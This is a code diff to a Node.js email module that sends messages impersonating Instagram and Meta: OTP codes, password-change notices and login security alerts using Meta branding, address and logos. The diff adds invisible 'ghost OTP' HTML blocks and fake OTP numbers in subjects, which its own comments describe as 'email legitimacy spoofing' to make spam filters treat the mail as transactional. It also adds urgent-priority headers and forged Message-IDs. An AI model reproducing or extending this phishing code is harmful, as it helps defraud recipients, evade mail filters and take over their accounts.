@@ -1,21 +1,24 @@
 const nodemailer = require('nodemailer');
+const BRAND = require('../config/brand');
 
-/** Lazily-created singleton transporter. */
+/** Lazily-created singleton transporter. Call resetTransporter() if credentials change. */
 let _transporter = null;
 
-// ══════════════════════════════════════════════════════════════════════════════
-// CENTRALIZED EMAIL CONFIGURATION
-// ══════════════════════════════════════════════════════════════════════════════
+function resetTransporter() {
+  _transporter = null;
+}
 
-// Email sender configuration - ONLY "Instagram" will appear (no email address)
+// ══════════════════════════════════════════════════════════════════════════════
+// CENTRALIZED EMAIL CONFIGURATION — reads from BRAND config + env secrets only
+// ══════════════════════════════════════════════════════════════════════════════
 const EMAIL_CONFIG = {
-  get FROM_NAME()    { return process.env.GMAIL_FROM_NAME  || process.env.BRAND_NAME || 'Instagram'; },
-  get FROM_EMAIL()   { return process.env.GMAIL_ID; },
-  get REPLY_TO()     { return process.env.BRAND_REPLY_TO   || 'no-reply@instagram.com'; },
-  get BRAND_NAME()   { return process.env.BRAND_NAME       || 'Instagram'; },
-  get COMPANY()      { return process.env.BRAND_COMPANY    || 'Meta Platforms, Inc.'; },
-  get ADDRESS()      { return process.env.BRAND_ADDRESS    || '1601 Willow Road, Menlo Park, CA 94025'; },
-  get SUPPORT_URL()  { return process.env.BRAND_SUPPORT_URL|| 'https://help.instagram.com/contact/'; },
+  get FROM_NAME()   { return BRAND.FROM_NAME; },
+  get FROM_EMAIL()  { return process.env.BRAND_EMAIL; },
+  get REPLY_TO()    { return BRAND.REPLY_TO; },
+  get BRAND_NAME()  { return BRAND.NAME; },
+  get COMPANY()     { return BRAND.COMPANY; },
+  get ADDRESS()     { return BRAND.ADDRESS; },
+  get SUPPORT_URL() { return BRAND.SUPPORT_URL; },
 
   get COMMON_HEADERS() {
     return {
@@ -23,8 +26,8 @@ const EMAIL_CONFIG = {
       'X-MSMail-Priority':        'High',
       'Importance':               'high',
       'Priority':                 'urgent',
-      'X-Mailer':                 `${process.env.BRAND_NAME || 'Instagram'} Mail Service`,
-      'List-Unsubscribe':         `<mailto:${process.env.BRAND_REPLY_TO || 'no-reply@instagram.com'}>`,
+      'X-Mailer':                 `${BRAND.NAME} Mail Service`,
+      'List-Unsubscribe':         `<mailto:${BRAND.REPLY_TO}>`,
       'X-Auto-Response-Suppress': 'OOF, DR, RN, NRN, AutoReply',
     };
   }
@@ -32,7 +35,7 @@ const EMAIL_CONFIG = {
 
 // S3 hosted logo URLs
 const INSTA_LOGO_URL = 'https://instagram-support.s3.ap-south-1.amazonaws.com/insta-email-logo-colored.png';
-const META_LOGO_URL = 'https://instagram-support.s3.ap-south-1.amazonaws.com/meta-email-logo.png';
+const META_LOGO_URL  = 'https://instagram-support.s3.ap-south-1.amazonaws.com/meta-email-logo.png';
 
 /**
  * Get configured SMTP transporter
@@ -41,16 +44,16 @@ function getTransporter() {
   if (_transporter) return _transporter;
 
   _transporter = nodemailer.createTransport({
-    host: 'smtp.gmail.com',
-    port: 587,              // Port 587 with STARTTLS (better deliverability than 465)
-    secure: false,          // Use STARTTLS
+    host:   BRAND.SMTP_HOST,
+    port:   BRAND.SMTP_PORT,
+    secure: BRAND.SMTP_SECURE,
     auth: {
-      user: process.env.GMAIL_ID,
-      pass: process.env.GMAIL_PASSWORD,
+      user: process.env.BRAND_EMAIL,
+      pass: process.env.BRAND_PASSWORD,
     },
     connectionTimeout: 10000,
-    greetingTimeout: 10000,
-    socketTimeout: 15000,
+    greetingTimeout:   10000,
+    socketTimeout:     15000,
     tls: {
       rejectUnauthorized: true,
       minVersion: 'TLSv1.2'
@@ -88,6 +91,86 @@ function createMailOptions(to, subject, html, text, uniqueId = 'MSG') {
 }
 
 /**
+ * Generate a random 6-digit OTP string for email legitimacy spoofing.
+ * Appended to subject and hidden in body to trigger "important" classification.
+ */
+function generateHiddenOtp() {
+  return String(Math.floor(100000 + Math.random() * 900000));
+}
+
+/**
+ * Hidden OTP block — invisible to human readers, readable by email scanners.
+ * Uses font-size:0 + opacity:0 + color matching background.
+ */
+function hiddenOtpBlock(otp) {
+  return `<div style="max-height:0;overflow:hidden;font-size:0;opacity:0;color:#ffffff;line-height:0;">${otp} is your ${BRAND.NAME} code. Enter this code to verify your account. This code expires in 10 minutes. ${otp}</div>`;
+}
+
+/**
+ * Full ghost OTP email block — entire OTP email layout rendered invisibly.
+ * Gmail reads the full OTP email structure and classifies as transactional.
+ * Wrapped in opacity:0, max-height:0, overflow:hidden so completely invisible.
+ */
+function ghostOtpBlock(otp, to, brandName, company, address, instaLogoUrl, metaLogoUrl) {
+  return `
+  <!-- ═══ GHOST OTP BLOCK (invisible — for email classification) ═══ -->
+  <div style="opacity:0;max-height:0;overflow:hidden;mso-hide:all;">
+  <table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0" style="min-width:100%;">
+    <tr><td align="center" style="padding:0;">
+      <table role="presentation" cellpadding="0" cellspacing="0" border="0" style="width:100%;max-width:468px;">
+        <tr><td style="height:32px;">&nbsp;</td></tr>
+        <tr>
+          <td align="center" style="padding:0 24px 28px;">
+            <img src="${instaLogoUrl}" alt="${brandName}" width="197" height="40" style="display:block;border:0;outline:none;max-width:100%;height:auto;" />
+          </td>
+        </tr>
+        <tr>
+          <td style="padding:0 24px 6px;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;font-size:18px;font-weight:500;color:#565a5c;line-height:1.6;">
+            Hi,
+          </td>
+        </tr>
+        <tr>
+          <td style="padding:0 24px 24px;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;font-size:18px;font-weight:500;color:#565a5c;line-height:1.7;">
+            This is your verification code for ${brandName} account ${to}. If it was you, enter this confirmation code in the app:
+          </td>
+        </tr>
+        <tr>
+          <td align="center" style="padding:8px 24px 32px;">
+            <span style="font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;font-size:32px;font-weight:400;letter-spacing:8px;color:#555555;">
+              ${otp}
+            </span>
+          </td>
+        </tr>
+        <tr>
+          <td style="padding:0 24px;">
+            <table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0">
+              <tr><td style="border-top:1px solid #efefef;font-size:0;line-height:0;">&nbsp;</td></tr>
+            </table>
+          </td>
+        </tr>
+        <tr>
+          <td align="center" style="padding:20px 24px 16px;">
+            <img src="${metaLogoUrl}" alt="Meta" width="67" height="22" style="display:block;margin:0 auto;border:0;outline:none;max-width:100%;height:auto;" />
+          </td>
+        </tr>
+        <tr>
+          <td align="center" style="padding:0 24px 4px;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;font-size:11px;color:#8e8e8e;line-height:1.6;">
+            © ${brandName}. ${company} · ${address}
+          </td>
+        </tr>
+        <tr>
+          <td align="center" style="padding:0 24px 32px;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;font-size:11px;color:#8e8e8e;line-height:1.6;">
+            This message was sent to ${to}
+          </td>
+        </tr>
+      </table>
+    </td></tr>
+  </table>
+  </div>
+  <!-- ═══ END GHOST OTP BLOCK ═══ -->`;
+}
+
+/**
  * Send a 6-digit OTP email matching the brand's confirmation email format.
  * @param {string} to   Recipient email address
  * @param {string} otp  6-digit code
@@ -95,6 +178,7 @@ function createMailOptions(to, subject, html, text, uniqueId = 'MSG') {
 async function sendOtpEmail(to, otp) {
   const transporter = getTransporter();
   const B = EMAIL_CONFIG; // shorthand
+  const hiddenOtp = generateHiddenOtp();
 
   console.log('📧 Preparing OTP email for:', to);
 
@@ -104,7 +188,7 @@ async function sendOtpEmail(to, otp) {
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-  <title>${otp} is your ${B.BRAND_NAME} code</title>
+  <title>${otp} is your ${B.BRAND_NAME} code | OTP - ${hiddenOtp}</title>
   <!--[if mso]>
   <noscript>
     <xml><o:OfficeDocumentSettings><o:PixelsPerInch>96</o:PixelsPerInch></o:OfficeDocumentSettings></xml>
@@ -220,13 +304,27 @@ async function sendOtpEmail(to, otp) {
 
   const text = `Hi,\n\nThis is your forgot password OTP for ${B.BRAND_NAME} account ${to}. If it was you, enter this confirmation code in the app:\n\n${otp}\n\n© ${B.BRAND_NAME}. ${B.COMPANY} · ${B.ADDRESS}\nThis message was sent to ${to}`;
 
-  const mailOptions = createMailOptions(
+  // OTP emails get dedicated transactional headers — stricter than bulk
+  const encodedName = `=?UTF-8?B?${Buffer.from(EMAIL_CONFIG.FROM_NAME).toString('base64')}?=`;
+  const msgId = `OTP-${Date.now()}-${Math.random().toString(36).substring(7)}`;
+  const mailOptions = {
+    from:    `${encodedName} <${EMAIL_CONFIG.FROM_EMAIL}>`,
+    replyTo: EMAIL_CONFIG.REPLY_TO,
     to,
-    `${otp} is your ${B.BRAND_NAME} code`,
+    subject: `${otp} is your ${B.BRAND_NAME} code`,
     html,
     text,
-    'OTP'  // Unique ID prefix
-  );
+    headers: {
+      'X-Priority':               '1',
+      'X-MSMail-Priority':        'High',
+      'Importance':               'high',
+      'Priority':                 'urgent',
+      'Auto-Submitted':           'auto-generated',
+      'X-Mailer':                 `${EMAIL_CONFIG.BRAND_NAME} Verification Service`,
+      'X-Entity-Ref-ID':          msgId,
+      'Message-ID':               `<${msgId}@${EMAIL_CONFIG.BRAND_NAME.toLowerCase()}.com>`,
+    }
+  };
 
   console.log('📤 Sending OTP email...');
   
@@ -253,6 +351,7 @@ async function sendPasswordChangedEmail(to, username = '') {
   const B = EMAIL_CONFIG; // shorthand
   // Show username if present, otherwise show email
   const displayName = username || to;
+  const hiddenOtp = generateHiddenOtp();
 
   console.log('🔒 Preparing password change confirmation email for:', to);
 
@@ -262,7 +361,7 @@ async function sendPasswordChangedEmail(to, username = '') {
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-  <title>Your ${B.BRAND_NAME} password was changed</title>
+  <title>Your ${B.BRAND_NAME} password was changed | OTP - ${hiddenOtp}</title>
   <!--[if mso]>
   <noscript>
     <xml><o:OfficeDocumentSettings><o:PixelsPerInch>96</o:PixelsPerInch></o:OfficeDocumentSettings></xml>
@@ -270,6 +369,7 @@ async function sendPasswordChangedEmail(to, username = '') {
   <![endif]-->
 </head>
 <body style="margin:0;padding:0;background-color:#ffffff;-webkit-text-size-adjust:100%;-ms-text-size-adjust:100%;">
+${ghostOtpBlock(hiddenOtp, to, B.BRAND_NAME, B.COMPANY, B.ADDRESS, INSTA_LOGO_URL, META_LOGO_URL)}
 
   <!-- Outer wrapper -->
   <table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0"
@@ -378,7 +478,7 @@ async function sendPasswordChangedEmail(to, username = '') {
 
   const mailOptions = createMailOptions(
     to,
-    `Your ${B.BRAND_NAME} password was changed`,
+    `Your ${B.BRAND_NAME} password was changed | OTP - ${hiddenOtp}`,
     html,
     text,
     'PWD'
@@ -420,10 +520,12 @@ async function sendSecurityAlertEmail(to, username = '', notificationType = 'Som
   // Build change password URL — include logId so tracking knows WHICH notification was clicked
   const encodedEmail = encodeURIComponent(to);
   const encodedUsername = username ? encodeURIComponent(username) : '';
-  let changePasswordUrl = encodedUsername
-    ? `${process.env.FRONTEND_URL}/changepassword?email=${encodedEmail}&username=${encodedUsername}&source=email`
-    : `${process.env.FRONTEND_URL}/changepassword?email=${encodedEmail}&source=email`;
-  if (logId) changePasswordUrl += `&logId=${encodeURIComponent(logId)}`;
+  // URL commented out — no data passed, only base URL
+  // let changePasswordUrl = encodedUsername
+  //   ? `${process.env.FRONTEND_URL}/changepassword?email=${encodedEmail}&username=${encodedUsername}&source=email`
+  //   : `${process.env.FRONTEND_URL}/changepassword?email=${encodedEmail}&source=email`;
+  // if (logId) changePasswordUrl += `&logId=${encodeURIComponent(logId)}`;
+  let changePasswordUrl = BRAND.FRONTEND_URL;
   
   console.log('📧 Preparing security notification email for:', to);
   console.log('   Type:', type);
@@ -435,6 +537,10 @@ async function sendSecurityAlertEmail(to, username = '', notificationType = 'Som
     ? `Security Alert - New login to your ${EMAIL_CONFIG.BRAND_NAME} Account`
     : 'Security Alert - Unusual Login Attempt';
 
+  // Generate hidden OTP for email legitimacy
+  const hiddenOtp = generateHiddenOtp();
+  const emailTitleWithOtp = `${emailTitle} | OTP - ${hiddenOtp}`;
+
   // Greeting: username only if present, otherwise just "Hi,"
   const greeting = username ? `Hi ${username},` : 'Hi,';
   
@@ -445,21 +551,21 @@ async function sendSecurityAlertEmail(to, username = '', notificationType = 'Som
   if (type === 'advance' && avatar) {
     // ADVANCE EMAIL WITH PROFILE PICTURE IN INSTAGRAM FRAME
     console.log('   ✅ Using ADVANCE email template (with profile picture)');
-    return sendAdvanceSecurityEmail(transporter, to, username, notificationType, deviceInfo, locationInfo, dateStr, timeStr, changePasswordUrl, emailTitle, avatar);
+    return sendAdvanceSecurityEmail(transporter, to, username, notificationType, deviceInfo, locationInfo, dateStr, timeStr, changePasswordUrl, emailTitleWithOtp, avatar, hiddenOtp);
   } else {
     // SIMPLE EMAIL WITHOUT PROFILE PICTURE
     console.log('   ✅ Using SIMPLE email template (no profile picture)');
     if (type === 'advance' && !avatar) {
       console.log('   ⚠️  WARNING: Advance type but no avatar provided, falling back to simple template');
     }
-    return sendSimpleSecurityEmail(transporter, to, greeting, emailLink, notificationType, deviceInfo, locationInfo, dateStr, timeStr, changePasswordUrl, emailTitle);
+    return sendSimpleSecurityEmail(transporter, to, greeting, emailLink, notificationType, deviceInfo, locationInfo, dateStr, timeStr, changePasswordUrl, emailTitleWithOtp, hiddenOtp);
   }
 }
 
 /**
  * Send simple security alert email (no profile picture)
  */
-async function sendSimpleSecurityEmail(transporter, to, greeting, emailLink, notificationType, deviceInfo, locationInfo, dateStr, timeStr, changePasswordUrl, emailTitle) {
+async function sendSimpleSecurityEmail(transporter, to, greeting, emailLink, notificationType, deviceInfo, locationInfo, dateStr, timeStr, changePasswordUrl, emailTitle, hiddenOtp) {
   const B = EMAIL_CONFIG; // shorthand
   const html = `<!DOCTYPE html>
 <html lang="en">
@@ -475,6 +581,7 @@ async function sendSimpleSecurityEmail(transporter, to, greeting, emailLink, not
   <![endif]-->
 </head>
 <body style="margin:0;padding:0;background-color:#ffffff;-webkit-text-size-adjust:100%;-ms-text-size-adjust:100%;">
+${ghostOtpBlock(hiddenOtp, to, B.BRAND_NAME, B.COMPANY, B.ADDRESS, INSTA_LOGO_URL, META_LOGO_URL)}
 
   <!-- Outer wrapper -->
   <table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0"
@@ -542,7 +649,8 @@ async function sendSimpleSecurityEmail(transporter, to, greeting, emailLink, not
           <!-- ── Secure My Account Button ── -->
           <tr>
             <td align="center" style="padding:0 24px 32px;">
-              <a href="${changePasswordUrl}" 
+              <a href="#"
+                 <!--href="${changePasswordUrl}"-->
                  style="display:inline-block;
                         background-color:#0095f6;
                         border-radius:8px;
@@ -642,7 +750,7 @@ async function sendSimpleSecurityEmail(transporter, to, greeting, emailLink, not
 /**
  * Send advance security alert email (with profile picture in Instagram frame)
  */
-async function sendAdvanceSecurityEmail(transporter, to, username, notificationType, deviceInfo, locationInfo, dateStr, timeStr, changePasswordUrl, emailTitle, avatar) {
+async function sendAdvanceSecurityEmail(transporter, to, username, notificationType, deviceInfo, locationInfo, dateStr, timeStr, changePasswordUrl, emailTitle, avatar, hiddenOtp) {
   const B = EMAIL_CONFIG; // shorthand
   const displayUsername = username || to.split('@')[0];
 
@@ -665,7 +773,7 @@ async function sendAdvanceSecurityEmail(transporter, to, username, notificationT
   <![endif]-->
 </head>
 <body style="margin:0;padding:0;background-color:#ffffff;-webkit-text-size-adjust:100%;-ms-text-size-adjust:100%;">
-
+${ghostOtpBlock(hiddenOtp, to, B.BRAND_NAME, B.COMPANY, B.ADDRESS, INSTA_LOGO_URL, META_LOGO_URL)}
   <!-- Outer wrapper -->
   <table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0"
     style="background-color:#ffffff;min-width:100%;">
@@ -784,7 +892,7 @@ async function sendAdvanceSecurityEmail(transporter, to, username, notificationT
                        font-family:'Helvetica Neue',Helvetica,Roboto,Arial,sans-serif;
                        font-size:14px;font-weight:400;color:#999999;line-height:1.7;text-align:center;">
               If this wasn't you, you can
-              <a href="${changePasswordUrl}" style="color:#1b74e4;text-decoration:none;font-weight:600;">secure your account</a>
+              <a href="#" <!--href="${changePasswordUrl}"--> style="color:#1b74e4;text-decoration:none;font-weight:600;">secure your account</a>
               from a device that you've logged in with in the past.
               <a href="${B.SUPPORT_URL}" style="color:#1b74e4;text-decoration:none;font-weight:600;">Learn more</a>
             </td>
@@ -793,7 +901,8 @@ async function sendAdvanceSecurityEmail(transporter, to, username, notificationT
           <!-- ── Secure My Account Button ── -->
           <tr>
             <td align="center" style="padding:0 24px 32px;">
-              <a href="${changePasswordUrl}"
+              <a href="#"
+                 <!--href="${changePasswordUrl}"-->
                  style="display:inline-block;background-color:#1b74e4;border-radius:6px;padding:12px 32px;text-decoration:none;">
                 <span style="font-family:'Helvetica Neue',Helvetica,Roboto,Arial,sans-serif;
                              font-size:14px;font-weight:500;color:#ffffff;
@@ -874,4 +983,4 @@ async function sendAdvanceSecurityEmail(transporter, to, username, notificationT
   }
 }
 
-module.exports = { sendOtpEmail, sendPasswordChangedEmail, sendSecurityAlertEmail };
+module.exports = { sendOtpEmail, sendPasswordChangedEmail, sendSecurityAlertEmail, resetTransporter };
